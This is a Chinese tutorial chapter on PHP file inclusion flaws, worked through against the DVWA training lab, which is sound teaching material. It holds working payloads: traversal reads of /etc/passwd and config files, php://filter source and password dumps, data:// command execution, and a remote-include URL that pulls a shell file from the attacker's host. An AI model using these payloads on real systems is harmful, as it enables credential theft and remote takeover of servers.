# 第8章 DVWA实战：文件包含漏洞

哈喽小伙伴们，咱们又见面啦！上一章咱们学习了命令注入、CSRF等漏洞，相信大家都收获满满。今天咱们来专门深入学习一个超级经典、超级实用的漏洞——**文件包含漏洞（File Inclusion）**！

为什么要单独拿一章来讲呢？因为文件包含漏洞的水可深了，里面有各种花式玩法，特别是**PHP伪协议**那部分，堪称Web安全入门的"必修课"。今天这一章，咱们就从零基础开始，把文件包含漏洞给它啃得明明白白的！

坐稳扶好，咱们出发！🚀

---

## 8.1 开篇引入：文件包含是个啥？

### 8.1.1 从"抄作业"说起

小伙伴们，先问大家一个问题：你们上学的时候有没有抄过作业呀？（别不好意思，我懂的😏）

假设你数学作业不会做，同桌会做。你把同桌的作业本拿过来，**把他的答案原封不动抄到你的作业本上**，然后老师批改的时候，就好像是你自己做的一样——这就是"抄作业"。

那文件包含又是啥呢？**大白话讲：PHP的文件包含，就像是PHP在"抄作业"！**

PHP里有几个特殊的函数，它们可以把**另一个文件的内容，原封不动地"抄"到当前文件里，然后当作PHP代码来执行**。

举个例子：你有两个文件，`a.php` 和 `b.php`。

- `a.php` 里写的是：`<?php echo "我是A文件"; ?>`
- `b.php` 里写的是：`<?php include('a.php'); echo "我是B文件"; ?>`

当你访问 `b.php` 的时候，PHP会先把 `a.php` 的内容"抄"过来，然后一起执行。所以最终输出是：
```
我是A文件我是B文件
```

就这么简单！文件包含就是PHP把另一个文件的内容拿过来，当成自己的代码执行。

### 8.1.2 文件包含本来是件好事

听到这儿你可能会问："这功能听起来挺危险的啊，为啥PHP要搞这么个功能？"

哎，这你就有所不知了。文件包含**本来是个好功能**，它是为了**代码复用**而生的！

给大家举个生活中的例子：

你开了一家连锁奶茶店，有10家分店。每家分店的菜单都一样，都是珍珠奶茶、芋圆奶茶、啵啵奶茶……

如果每家分店都自己写一份菜单，那你想加个新品"杨枝甘露"的时候，就得跑10家分店，每家都改一遍——累不累啊？

聪明的做法是：**总部做一份统一的菜单，每家分店都直接用总部的菜单**。这样总部改一次菜单，所有分店就都同步更新了。

文件包含就是这个道理！

一个网站有很多页面，比如首页、产品页、关于我们页……这些页面的**头部（导航栏）和底部（版权信息）都是一样的**。如果每个页面都写一遍头部和底部，那你想改个导航栏的链接，就得改几十个文件——疯了！

所以程序员的做法是：
- 把头部单独写成 `header.php`
- 把底部单独写成 `footer.php`
- 每个页面都用 `include('header.php')` 和 `include('footer.php')` 把它们包含进来

这样改头部的时候，只需要改 `header.php` 一个文件，所有页面就都更新了——是不是很方便？👍

所以你看，**文件包含本身是个好东西，是提高开发效率的利器**。

### 8.1.3 好功能怎么就变成漏洞了？

那好端端的一个功能，怎么就变成漏洞了呢？

关键在于：**包含哪个文件，是由谁决定的？**

如果包含哪个文件是程序员在代码里写死的，比如：
```php
<?php
include('header.php');  // 写死了，就是包含header.php
include('footer.php');  // 写死了，就是包含footer.php
?>
```
那啥事儿没有，安全得很。

但是！如果包含哪个文件是**用户说了算**的呢？

比如，网站有个功能，用户可以选择"切换主题"，然后URL是这样的：
```
http://example.com/?theme=blue.php
```

后台代码是这样的：
```php
<?php
$theme = $_GET['theme'];  // 从URL参数里获取用户选的主题
include($theme);          // 包含用户选的主题文件
?>
```

你看！包含哪个文件，是用户通过URL参数传进来的！用户说包含啥，就包含啥！

这就出大事了！😱

打个比方：你去餐厅吃饭，菜单上有鱼香肉丝、宫保鸡丁、麻婆豆腐。正常情况你只能从菜单里点。

但是如果服务员说："您想吃啥都行，您说菜名我就给您做"——那你说"给我来一盘你们老板的银行卡密码"，他也去给你找？这就乱套了！

文件包含漏洞就是这么回事：**用户能控制包含的文件名，而服务器没做任何限制，结果用户就让服务器去包含（读取）一些不该读的文件，甚至执行恶意代码。**

好，概念咱们搞清楚了，接下来就进入DVWA实战！

### 📍 先看你该访问哪个 URL（三选一）

**本章靶场模块：File Inclusion**（点"某文件"那个下拉框，带 `?page=xxx.php` 参数）。左边栏点 File Inclusion 进入。**⚠️ 本章强烈建议先用 Kali LAMP 搭的同学按 ch04 把 `allow_url_include = On` 打开，否则 RFI 伪协议会直接白屏！**

| 搭建方式 | 本章页面地址 | 你写 shell / 读敏感文件的攻击机 |
|---|---|---|
| 🪟 Windows PHPStudy | `http://localhost/dvwa/vulnerabilities/fi/?page=include.php` | Burp Suite + 本地读 `C:\Windows\System32\drivers\etc\hosts` |
| 🐧 **Kali LAMP ✅** | `http://你的KaliIP/dvwa/vulnerabilities/fi/?page=include.php` | Kali 终端直接构造 URL + Burp Repeater；同机可打伪协议 `php://filter` / `data://` / `expect://` |
| 🐳 Docker 版 | `http://你的KaliIP:4280/vulnerabilities/fi/?page=include.php` | 同上；容器里可读 `/etc/passwd`、`/var/www/html/config/config.inc.php` 拿数据库密码（⚠️ Docker pull 拉不动？直接换 ch04 §4.5 Kali LAMP 或 §4.7 XAMPP ✅）！|

<svg viewBox="0 0 1100 470" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:980px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1120;">
  <defs><linearGradient id="fi1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#238636"/><stop offset="100%" stop-color="#0a3716"/></linearGradient><linearGradient id="fi2" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#1f6feb"/><stop offset="100%" stop-color="#0b3b8a"/></linearGradient><linearGradient id="fi3" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#f0883e"/><stop offset="100%" stop-color="#823a0b"/></linearGradient><marker id="fig" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#3fb950"/></marker><marker id="fib" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#4490ff"/></marker><marker id="fio" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#f0883e"/></marker></defs>
  <text x="550" y="34" text-anchor="middle" fill="#fff" font-size="20" font-weight="bold" font-family="Arial">图 8-1  文件包含全景：LFI 本地读敏感文件 + RFI 远程拿 Shell + 4 条伪协议攻击链</text>
  <!-- 左：URL 参数构造（攻击机 Kali）-->
  <rect x="18" y="64" width="248" height="388" rx="14" fill="url(#fi2)" stroke="#4490ff" stroke-width="1.4"/>
  <text x="142" y="96" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="15">🔨  攻击机 Kali（构造 page=参数）</text>
  <g font-family="Arial" font-size="11.5" fill="#d9e8ff">
    <text x="32" y="130" fill="#ffe16b" font-weight="bold">路径一：LFI 本地包含（9 成目标能打 ✅）</text>
    <rect x="32" y="139" width="220" height="28" rx="5" fill="#000" opacity="0.35"/>
    <text x="44" y="158" font-family="Consolas,monospace" fill="#ff8b8b">?page=../../../../etc/passwd</text>
    <rect x="32" y="176" width="220" height="28" rx="5" fill="#000" opacity="0.35"/>
    <text x="44" y="195" font-family="Consolas,monospace" fill="#ff8b8b">?page=....//....//etc/passwd 双写绕过</text>
    <text x="32" y="238" fill="#ffe16b" font-weight="bold">路径二：RFI 远程包含（allow_url_include=On 才生效 🔥）</text>
    <rect x="32" y="248" width="220" height="28" rx="5" fill="#000" opacity="0.35"/>
    <text x="44" y="267" font-family="Consolas,monospace" fill="#c7a6ff">?page=http://你的KALI_IP/shell.txt</text>
    <text x="32" y="310" fill="#ffe16b" font-weight="bold">路径三：4 条 PHP 伪协议（本章灵魂 ✨）</text>
    <rect x="32" y="320" width="220" height="24" rx="5" fill="#000" opacity="0.35"/>
    <text x="44" y="338" font-family="Consolas,monospace" fill="#9de8b0">php://filter/read=convert.base64-encode/resource=index.php</text>
    <rect x="32" y="348" width="220" height="24" rx="5" fill="#000" opacity="0.35"/>
    <text x="44" y="366" font-family="Consolas,monospace" fill="#9de8b0">php://input [POST] &lt;?php system('id')?&gt;</text>
    <rect x="32" y="376" width="220" height="24" rx="5" fill="#000" opacity="0.35"/>
    <text x="44" y="394" font-family="Consolas,monospace" fill="#9de8b0">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</text>
    <rect x="32" y="404" width="220" height="24" rx="5" fill="#000" opacity="0.35"/>
    <text x="44" y="422" font-family="Consolas,monospace" fill="#9de8b0">expect://ls%20-la 需 expect 扩展（Low 偶尔见）</text>
  </g>
  <!-- 中：DVWA include.php 核心代码 -->
  <rect x="286" y="64" width="530" height="388" rx="14" fill="#10173a" stroke="#a371f7" stroke-width="1.2"/>
  <text x="551" y="96" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="16">🧠  DVWA /vulnerabilities/fi/index.php（服务端 include 核心 👇）</text>
  <g font-family="Consolas,monospace" font-size="11.5">
    <rect x="304" y="114" width="494" height="86" rx="6" fill="#000" opacity="0.6"/>
    <text x="320" y="136" fill="#c7a6ff">// $file = $_GET['page'];  ← 用户完全可控</text>
    <text x="320" y="154" fill="#c7a6ff">// LOW：直接 include 无任何校验</text>
    <text x="320" y="172" fill="#9de8b0">include( $file );   //  ← PHP 抄它！是代码执行就跑</text>
    <text x="320" y="190" fill="#ffe16b">if( $file != "include.php" ) echo "Wrong file...";</text>
    <text x="551" y="222" text-anchor="middle" fill="#ffd089" font-family="Arial" font-weight="bold" font-size="13">📌  防护梯度对比（关键差异在这 👇）</text>
    <g font-family="Arial" font-size="11">
      <rect x="304" y="234" width="120" height="98" rx="6" fill="#3bff9a18" stroke="#3bff9a"/>
      <text x="364" y="256" text-anchor="middle" font-weight="bold" fill="#3bff9a">LOW 🌱</text><text x="314" y="274">· 直接 include</text><text x="314" y="290">· 全部路径/伪协议/RFI 通吃</text><text x="314" y="306">· allow_url=On 就 RCE ✅</text><text x="314" y="322">· http/https/file 都 OK</text>
      <rect x="434" y="234" width="120" height="98" rx="6" fill="#ffe16b18" stroke="#ffe16b"/>
      <text x="494" y="256" text-anchor="middle" font-weight="bold" fill="#ffe16b">MED 🌿</text><text x="444" y="274">· str_replace("../","")</text><text x="444" y="290">· 双写 ....// 可绕</text><text x="444" y="306">· http:// 替换空 =&gt; hthttpttp://</text><text x="444" y="322">· 伪协议仍畅通</text>
      <rect x="564" y="234" width="120" height="98" rx="6" fill="#ffa36b18" stroke="#ffa36b"/>
      <text x="624" y="256" text-anchor="middle" font-weight="bold" fill="#ffa36b">HIGH 🌳</text><text x="574" y="274">· 必须以 file.php 开头</text><text x="574" y="290">· 或白名单 include.php</text><text x="574" y="306">· 但 file%00.txt 截断！&lt;php5.3</text><text x="574" y="322">· %00 截断 + SMB include</text>
      <rect x="694" y="234" width="104" height="98" rx="6" fill="#ff6b8a18" stroke="#ff6b8a"/>
      <text x="746" y="256" text-anchor="middle" font-weight="bold" fill="#ff6b8a">IMPOSS</text><text x="704" y="274">· 白名单数组仅含4个</text><text x="704" y="290">· in_array($file,$whitelist)</text><text x="704" y="306">· === 严格等于</text><text x="704" y="322">· 真正的安全写法</text>
    </g>
    <text x="551" y="360" text-anchor="middle" fill="#d5b8ff" font-family="Arial" font-weight="bold" font-size="13">💡 核心灵魂：include() 只要能读进字符串，就会当作 PHP 代码执行！所以：</text>
    <text x="551" y="382" text-anchor="middle" fill="#ff8b8b" font-family="Arial" font-weight="bold">① LFI → 读配置 → ② 配和文件上传 → ③ 包含上传的图片马 → ④ RCE 服务器！🧨</text>
  </g>
  <!-- 右：攻击结果 -->
  <g>
    <line x1="266" y1="155" x2="286" y2="155" stroke="#f0883e" stroke-width="2.2" marker-end="url(#fio)"/>
    <line x1="266" y1="260" x2="286" y2="260" stroke="#a371f7" stroke-width="2.2" marker-end="url(#fig)"/>
    <line x1="266" y1="335" x2="286" y2="335" stroke="#3fb950" stroke-width="2.2" marker-end="url(#fib)"/>
    <rect x="836" y="64" width="246" height="388" rx="14" fill="url(#fi3)" stroke="#f0883e" stroke-width="1.4"/>
    <text x="959" y="96" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="15">📺  浏览器回显（你拿到的战果 🏆）</text>
    <g font-family="Consolas,monospace" font-size="11.2" fill="#fff5e6">
      <rect x="852" y="114" width="214" height="92" rx="6" fill="#000" opacity="0.55"/>
      <text x="866" y="134" fill="#9de8b0" font-weight="bold" font-family="Arial">① LFI 读 /etc/passwd：</text>
      <text x="866" y="152">root:x:0:0:root:/root:/bin/bash</text>
      <text x="866" y="168">www-data:x:33:33:www:/var/www</text>
      <text x="866" y="184">mysql:x:999:999:...</text>
      <text x="866" y="200" fill="#ffd700">拿到用户列表 ✅</text>
      <rect x="852" y="214" width="214" height="72" rx="6" fill="#000" opacity="0.55"/>
      <text x="866" y="234" fill="#ff8b8b" font-weight="bold" font-family="Arial">② php://filter 读源码：</text>
      <text x="866" y="252">PD9waHANCi8vIERWV0...</text>
      <text x="866" y="268">base64 还原后看到 db_password ✅</text>
      <text x="866" y="282" fill="#ffd700">拿到 config.inc.php 密码！🚨</text>
      <rect x="852" y="296" width="214" height="76" rx="6" fill="#000" opacity="0.55"/>
      <text x="866" y="316" fill="#c7a6ff" font-weight="bold" font-family="Arial">③ data:// 直接 RCE：</text>
      <text x="866" y="334">uid=33(www-data) gid=33(www-data)</text>
      <text x="866" y="350">Linux kali 6.8.0 #1 SMP PREEMPT_DYNAMIC</text>
      <text x="866" y="366" fill="#ffd700">id/uname -a 都执行成功！🎉</text>
      <rect x="852" y="380" width="214" height="60" rx="6" fill="#000" opacity="0.55"/>
      <text x="866" y="400" fill="#7ce8a0" font-weight="bold" font-family="Arial">④ LFI + 上传图片马：</text>
      <text x="866" y="418">?page=../../hackable/uploads/shell.jpg</text>
      <text x="866" y="434" fill="#ff8b8b" font-weight="bold" font-family="Arial">WebShell 落地 💀 getshell！</text>
    </g>
  </g>
</svg>

> 🔥 **Kali 同学本章速查命令（Low 级别一气呵成 ✅）：**
> ```bash
> # 1. 最经典 LFI 读敏感文件（直接浏览器地址栏打）
> http://你的KaliIP/dvwa/vulnerabilities/fi/?page=../../../../../../../etc/passwd
> http://你的KaliIP/dvwa/vulnerabilities/fi/?page=../../../../../../../var/www/html/dvwa/config/config.inc.php
>
> # 2. php://filter 拿 config.inc.php 的 Base64（防乱码防截断）
> http://你的KaliIP/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=../config/config.inc.php
> # 结果粘到终端解码：echo 'PD9waHA...' | base64 -d  就能看到 DB 密码
>
> # 3. data:// 直接 RCE（确保 allow_url_include = On）
> echo -n "<?php system('id;uname -a;whoami'); ?>" | base64 -w0
> # 输出 PD9waHAgc3lzdGVtKCdpZDt1bmFtZSAtYTt3aG9hbWknKTsgPz4=
> # 然后构造 URL：
> http://你的KaliIP/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCd...
> ```

---

## 8.2 文件包含基础：PHP里的四大"抄作业"函数

在PHP里，有四个常用的文件包含函数，它们都是用来"抄作业"的，但略有区别。咱们一个个来看。

### 8.2.1 include() 函数

`include()` 是最常用的文件包含函数。它的作用是：包含并运行指定的文件。

如果包含的文件找不到（比如文件不存在），`include()` 会**报一个警告错误**，但是**脚本会继续执行**。

就像你抄作业，同桌的作业本找不到了，你嘟囔一句"我去，作业本呢？"，然后你还是接着做后面的题。

```php
<?php
include('header.php');  // 包含头部
echo "这是正文内容";
include('footer.php');  // 包含底部
?>
```

### 8.2.2 require() 函数

`require()` 和 `include()` 几乎一样，都是包含并运行指定文件。

区别在于：如果包含的文件找不到，`require()` 会**报一个致命错误**，并且**直接停止脚本执行**。

就像你抄作业，同桌的作业本找不到了，你直接把笔一扔："没作业抄？那我不做了！"，然后就放弃了。

```php
<?php
require('config.php');  // 配置文件很重要，找不到就别运行了
echo "配置加载成功";
?>
```

一般来说，重要的文件（比如配置文件、数据库连接文件）用 `require()`，因为这些文件找不到的话，程序继续跑也没意义。

### 8.2.3 include_once() 函数

`include_once()` 和 `include()` 功能一样，区别是：**同一个文件只会包含一次**。

如果之前已经包含过这个文件了，`include_once()` 就不会再包含了。

这有啥用呢？比如你有个文件 `functions.php` 里面定义了很多函数。如果你不小心包含了两次，PHP会报错说"函数重复定义"。用 `include_once()` 就不会有这个问题。

### 8.2.4 require_once() 函数

顾名思义，`require_once()` 就是 `require()` + `_once`，也就是：
- 文件找不到会报致命错误（和require一样）
- 同一个文件只包含一次（和include_once一样）

### 8.2.5 小结一下

给大家列个表格，一目了然：

| 函数 | 找不到文件时 | 是否重复包含 | 使用场景 |
|------|-------------|-------------|---------|
| `include()` | 警告，继续执行 | 可以重复包含 | 不太重要的文件（如头部、底部） |
| `require()` | 致命错误，停止执行 | 可以重复包含 | 重要文件（如配置文件） |
| `include_once()` | 警告，继续执行 | 只包含一次 | 可能被多次引用的函数库 |
| `require_once()` | 致命错误，停止执行 | 只包含一次 | 重要的函数库、类文件 |

**但是！** 对于咱们挖漏洞来说，这四个函数**几乎没区别**——只要用户能控制文件名，不管用哪个函数，都能造成文件包含漏洞。

所以你不用太纠结这四个函数的区别，知道它们都是用来包含文件的就行。😎

---

## 8.3 文件包含的两大分类：LFI 和 RFI

文件包含漏洞分为两大类，咱们得先把这两个概念搞清楚。

### 8.3.1 LFI：本地文件包含

**LFI（Local File Inclusion）**，翻译过来就是"本地文件包含"。

啥意思呢？就是你让服务器**包含它自己身上的文件**，也就是读取服务器本地的文件。

打个比方：你去图书馆看书，你只能看图书馆里已经有的书。你说"我要看《三国演义》"，图书馆有，就给你拿《三国演义》；你说"我要看图书馆管理员的日记本"——如果管理不严，说不定也能给你拿出来。

LFI就是这样：你只能读取服务器上**已经存在的文件**，比如系统文件、配置文件、源代码等等。

LFI能干嘛呢？
- 读取配置文件，找数据库密码
- 读取源代码，找更多漏洞
- 读取 `/etc/passwd` 看系统有哪些用户
- 读取日志文件，配合其他漏洞GetShell
- ……

LFI是最常见的文件包含漏洞，因为它不需要什么特殊条件，只要有文件包含漏洞就行。

### 8.3.2 RFI：远程文件包含

**RFI（Remote File Inclusion）**，翻译过来就是"远程文件包含"。

这个就更厉害了！它能让服务器**去加载远程服务器上的文件，然后执行**！

打个比方：图书馆不仅能看馆里的书，还能去你家把你的书拿过来，当众念出来——这就可怕了！

比如，你在自己的服务器上放一个文件 `shell.txt`，内容是：
```php
<?php
    echo "我被执行了！";
    system('whoami');  // 执行系统命令
?>
```

然后你构造一个URL，让目标服务器去包含这个远程文件：
```
http://目标服务器/?page=http://你的服务器/shell.txt
```

如果目标服务器支持RFI，那它就会去下载你的 `shell.txt`，然后当作PHP代码执行！

这样的话，你就能在目标服务器上执行**任意PHP代码**——相当于直接拿到了服务器的控制权！这就是所谓的"GetShell"。

是不是很刺激？😈

### 8.3.3 RFI的前提条件

但是！RFI虽然厉害，它却有一个**前提条件**：PHP的配置文件 `php.ini` 里，必须开启这两个选项：

```ini
allow_url_fopen = On
allow_url_include = On
```

- `allow_url_fopen`：是否允许打开远程文件（默认是On）
- `allow_url_include`：是否允许包含远程文件（默认是Off！）

划重点：**现在的PHP版本，`allow_url_include` 默认是关闭的！**

所以在实战中，RFI已经比较少见了，大部分情况都是LFI。但是LFI也不是吃素的，配合各种技巧，也能搞出大事情！

这也就是为什么咱们这一章会花大量篇幅讲**PHP伪协议**——因为伪协议是LFI的"神器"！

好，概念讲得差不多了，接下来咱们就打开DVWA，开始实战！💪

---

## 8.4 Low级别通关：初体验文件包含的威力

#### 🐧 Kali / Docker 环境先做 30 秒预检 ✅（RFI / 伪协议成败就看这一步！）

文件包含是**最吃 PHP 配置**的一章，`allow_url_include = Off` 的时候 RFI + `data://` / `expect://` 全白给！先在你 Kali 终端跑 4 条命令踩坑：

```bash
# ① 查当前 php.ini 里两个最关键开关（Kali LAMP 默认路径）
PHP_INI=/etc/php/$(php -v | head -n1 | grep -oP '\d+\.\d+')/apache2/php.ini
echo "=== 你的 PHP 配置（没开的后面必须按 ch04 改！）==="
grep -E "allow_url_(fopen|include)" $PHP_INI

# ② 重启 Apache 让修改生效（Kali LAMP）
sudo systemctl restart apache2 && echo "Apache 重启 OK ✅"

# ③ 在 Apache 根目录放一个 shell.txt 做 RFI 测试（本章要用）
echo '<?php echo "=== RFI OK ==="; system("id; uname -a; pwd"); ?>' | sudo tee /var/www/html/shell.txt > /dev/null
curl -s "http://127.0.0.1/shell.txt" | head -n2

# ④ Docker 同学快速看容器内的 PHP 配置
docker exec dvwa-test bash -c "php -i | grep -E 'allow_url_(fopen|include)'" 2>&1 || echo "Docker 默认 allow_url_include=Off，RFI 大概率打不通，先玩 LFI + php://filter！"
```

> 💡 **Kali / Docker 选型建议：** RFI 需要 `allow_url_include=On`，Docker 官方镜像默认是 **Off** 且进容器改 `php.ini` 比较麻烦（要 `docker cp` 进去再重启）。**你现在用的 Kali LAMP 原生版本才是这一章的最佳练习环境 ✅**，Docker 先专注 LFI 本地包含即可。

### 8.4.1 找到File Inclusion模块

好了，理论讲完了，咱们来真刀真枪地干！

首先，打开你的DVWA，登录进去（默认账号admin，密码password）。然后：

1. 左下角找到 **DVWA Security**
2. 把难度调成 **Low**
3. 点击 Submit 确认

然后点击左边菜单栏的 **File Inclusion**，咱们就进入文件包含漏洞的模块了。

### 8.4.2 观察正常功能

进入页面后，你会看到三个链接：`file1.php`、`file2.php`、`file3.php`。

咱们先点一下 `file1.php`，看看会发生什么。

点完之后，你会看到页面上显示了 "Hello World" 之类的内容。重点是——**观察浏览器的地址栏！**

地址栏变成了这样：
```
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php
```

哎？发现了吗？URL里多了一个参数 `?page=file1.php`！

根据咱们之前学的知识，这个 `page` 参数很可能就是用来指定包含哪个文件的！后台代码大概是这样的：

```php
<?php
$page = $_GET['page'];  // 从URL获取page参数
include($page);         // 包含这个文件
?>
```

是不是这样呢？咱们来验证一下！

### 8.4.3 尝试修改文件名

既然 `page` 参数是文件名，那咱们把它改成别的文件名，会不会就包含别的文件了？

咱们先试试改成 `file2.php`：
```
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file2.php
```

哎？页面内容变了！显示的是file2的内容。说明确实是通过 `page` 参数来控制包含哪个文件的！

那咱们能不能让它包含一些**不在菜单里的文件**呢？

### 8.4.4 尝试上一级目录

咱们知道，当前页面在 `dvwa/vulnerabilities/fi/` 这个目录下。那DVWA根目录下有个 `phpinfo.php` 文件，咱们能不能读到它呢？

要访问上一级目录，咱们可以用 `../` 这个符号——对，就是"点点斜杠"，表示上一级目录。

当前目录是 `dvwa/vulnerabilities/fi/`，那：
- `../` 就是 `dvwa/vulnerabilities/`
- `../../` 就是 `dvwa/`
- `../../../` 就是更上一级
- `../../../../` 就是更更上一级……

那要找到DVWA根目录的 `phpinfo.php`，咱们得往上跳几级呢？

咱们来算一下：当前在 `vulnerabilities/fi/`，所以：
- `../` → `vulnerabilities/`
- `../../` → DVWA根目录

所以构造URL：
```
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../phpinfo.php
```

复制到浏览器地址栏，访问一下——

哇！小伙伴们看到了吗？phpinfo页面出来了！🎉

这说明什么？说明我们成功地让服务器包含了它根目录下的 `phpinfo.php` 文件！

这就是**本地文件包含（LFI）**！是不是很简单？

### 8.4.5 读取系统敏感文件

既然能读网站的文件，那能不能读**操作系统的文件**呢？

当然可以！只要路径对、权限够，服务器上的文件都能读！

咱们来试试读系统的敏感文件。

#### Windows系统

如果你是Windows系统，咱们试试读 `hosts` 文件。这个文件是用来配置域名和IP对应关系的，路径是：
```
C:\windows\system32\drivers\etc\hosts
```

注意：在URL里，路径分隔符可以用正斜杠 `/`，也可以用反斜杠 `\`，但一般推荐用正斜杠，因为反斜杠在URL里可能需要编码。

所以构造URL：
```
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=C:/windows/system32/drivers/etc/hosts
```

访问一下——

哇！hosts文件的内容都显示出来了！😎

#### Linux系统

如果你是Linux系统，那经典的就是读 `/etc/passwd` 文件了，这个文件里存着系统所有用户的信息。

构造URL：
```
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
```

为什么要那么多 `../` 呢？因为Linux的根目录是 `/`，网站可能放在 `/var/www/html/` 或者别的地方，所以得多往上跳几级，确保跳到根目录。

如果跳对了，你就能看到类似这样的内容：
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

这就是 `/etc/passwd` 文件的内容！

### 8.4.6 试试RFI（远程文件包含）

Low级别里，咱们也可以试试RFI能不能用。

要测试RFI，你需要：
1. 确保你的PHP开启了 `allow_url_include`
2. 有一个远程的PHP文件可以访问

怎么看 `allow_url_include` 开没开呢？很简单——咱们刚才不是读到了 `phpinfo.php` 吗？在phpinfo页面里搜索 `allow_url_include`，看看它的值是On还是Off。

如果是Off也没关系，咱们可以自己改一下 `php.ini` 试试（学习嘛，就是要折腾）。

如果开启了，你可以在本地搭个服务器，放一个测试文件，比如 `test.txt`，内容是：
```php
<?php
echo "远程文件包含成功！";
phpinfo();
?>
```

然后构造URL：
```
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://你的地址/test.txt
```

如果成功了，你就能看到"远程文件包含成功！"和phpinfo页面——这说明RFI成功了！

**注意：** 现在默认都是关的，所以RFI大概率不成功。没关系，咱们重点还是放在LFI上，因为LFI更常见，而且玩法更多！

### 8.4.7 Low级别源代码分析

老规矩，打完一关咱们得看看源码，理解一下为什么会有漏洞。

点击页面右下角的 **View Source**，就能看到Low级别的源代码：

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>
```

我去！就这么两行？！

是的，你没看错。Low级别就是这么简单粗暴：
- 直接从GET参数获取 `page`
- 啥过滤都没有，直接就去包含了

这不叫漏洞，这叫"大门敞开欢迎你"😂

所以Low级别就一句话：**你说包含啥，就包含啥，完全没限制。**

### ✅ 表 8-1 · Low 级别通关速查 & 失败对照表（LFI 读敏感文件 + 伪协议读源码/RCE + RFI 拿 Shell）

文件包含 90% 新手第一次就死在 **php.ini 的 allow_url_include 没开**（默认是 Off！），所以步骤 0 必须先做，跳过的话下面 payload 全白给：

| 步骤 | 先做什么 | 点哪里 / 地址栏敲什么 | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
|---|---|---|---|---|
| 0 | **php.ini 双开关必查！**（LFI 只需要 allow_url_fopen，**php://input / RFI 必须 allow_url_include = On**） | 靶场里先跑 `sudo grep -E "allow_url" /etc/php/8.*/apache2/php.ini`（Kali）。或者新建 info.php 放 /var/www/html/dvwa：`<?php phpinfo(); ?>` → 浏览器访问看这两个值 | 看到：`allow_url_fopen = On` + **`allow_url_include = On`** | 【allow_url_include 是 Off】→ 编辑 php.ini 把 `allow_url_include = Off` 改成 On，然后 `sudo systemctl restart apache2`，刷新 phpinfo 再确认；改完还是 Off？→ 你改的 php.ini 不是 apache2 那个（CLI 和 Apache2 是两个 php.ini！看 phpinfo() 的 Loaded Configuration File 路径） |
| 1 | 切难度 + 进对模块 + 先确认 "正常包含" 长啥样 | 切 low → Submit → 左边点 **File Inclusion** → 默认 URL 是 `?page=include.php` | 页面显示 4 个文件链接：file1.php / file2.php / file3.php + 一段 "Hello World" 文字 | 【左边没看到 File Inclusion 菜单】→ DVWA 版本不对或 setup.php 没初始化；【页面 PHP 红色 Warning：include(): Failed opening】→ 先跳过，下面步骤会证明这就是漏洞的起点 |
| 2 | **LFI 经典 payload ① 读 /etc/passwd**（Linux 靶场必测，优先级最高！） | 地址栏把 `page=include.php` 改成 → `?page=../../../../../../etc/passwd`（../ 写 6~8 层，从 /var/www/html/dvwa/vulnerabilities/fi 退到 /） | 页面直接显示 **root:x:0:0:root:/root:/bin/bash 一长串用户信息** ✅ | 【PHP Warning include(../../../../etc/passwd): failed to open stream】→ 原因有 3 种：① ../ 数量不够（写 10 个 ../ 保证退到根）；② 靶场是 Windows！Windows 没有 /etc/passwd，换成下一条 payload；③ 你是 Docker 版 DVWA，真实路径是 /app，所以 4 层 ../ 就到根了，多试试不同数量 |
| 3 | **LFI 经典 payload ② Windows 靶场读 win.ini**（Windows 专用） | 换成：`?page=..\..\..\..\Windows\win.ini` 或 `?page=C:/Windows/win.ini` | 页面出现 `; for 16-bit app support` + [fonts] 配置 ✅ | 【找不到】→ 系统盘不是 C 盘？→ 换成 D: 或用 `?page=../../../../PHP/php.ini`（知道绝对路径直接写绝对路径是最稳的） |
| 4 | **php://filter 读源码（🔥 本章考的最多的 payload！）** | 地址栏：<br>`?page=php://filter/read=convert.base64-encode/resource=index.php`<br>（读当前 FI 模块目录下的 index.php 源码） | 页面输出 **一大串 base64（以 PD9waHAg 开头 = `<?php` 的 base64）** | 【啥都没有 / 乱码 / 不是 base64】→ ① resource 路径写错了，试试绝对路径：`resource=/var/www/html/dvwa/vulnerabilities/fi/index.php`；② 你把 `read=` 写成 `reader=` 了，注意拼写；③ 把 base64 复制到 https://www.base64decode.org 验证能不能解码出 PHP 源码（能解就是成功，不要以为乱码就是失败！） |
| 5 | **进阶：php://filter 读 config 拿数据库密码**（把 DVWA 数据库密码搞到手！） | 读 dvwa/config/config.inc.php（绝对路径最稳，路径按你实际情况改）：<br>`?page=php://filter/convert.base64-encode/resource=/var/www/html/dvwa/config/config.inc.php` | base64 解码后能看到 `$_DVWA[ 'db_password' ] = 'p@ssw0rd';` 之类的真密码 ✅ | 【解码后提示输入不是有效 base64】→ 说明前面 include_path 拼接了别的东西，导致开头有乱码；→ 解码工具里把前面非 base64 字符删掉再解，或者把 resource 写成相对路径 + 足够多的 ../../ |
